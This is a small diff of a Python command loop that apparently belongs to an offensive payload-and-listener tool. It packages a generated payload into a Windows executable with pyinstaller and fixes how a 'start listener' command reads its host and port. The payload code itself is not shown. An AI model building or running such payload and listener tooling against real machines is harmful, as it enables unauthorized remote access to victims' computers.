@@ -75,11 +75,11 @@ while True:
             os.system('pyinstaller --onefile Payloads\Generated\payload.pyw')
             os.system('COPY "dist/payload.exe" "Payloads/Generated"')
     #TODO ADD MORE LISTENERS
-    elif cmd == 'start listener':
-        lhost = cmd.split(' ')[1]
-        lport = cmd.split(' ')[2]
+    elif cmd.startswith('start listener ') :
+        lhost = cmd.split(' ')[2]
+        lport = cmd.split(' ')[3]
         if payload.startswith("Windows"):
-            listener = 'Windows/windows_listener'
+            listener = 'Payloads/Windows/windows_listener'
             startListener(listener, lhost, lport)
             print(f'Started Windows/windows_listener on {lhost}:{lport}')
 
